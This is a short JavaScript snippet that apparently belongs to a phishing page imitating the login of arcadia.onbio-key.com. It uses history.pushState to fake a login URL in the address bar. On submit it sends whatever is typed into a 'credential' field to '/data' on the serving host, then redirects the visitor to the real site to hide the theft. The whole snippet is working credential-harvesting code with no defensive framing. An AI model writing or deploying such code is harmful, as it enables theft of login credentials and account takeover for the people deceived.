window.history.pushState("https://arcadia.onbio-key.com/", "", '/_layouts/PG/login.aspx?ReturnUrl=%2f');

document.getElementById("submitButton").addEventListener('click', function () {

  fetch('/data', { method: 'POST', body: document.getElementById("credential").value })
    .then(response => response.text())
    .then(text => {
      location.href = "https://arcadia.onbio-key.com";
    })

});
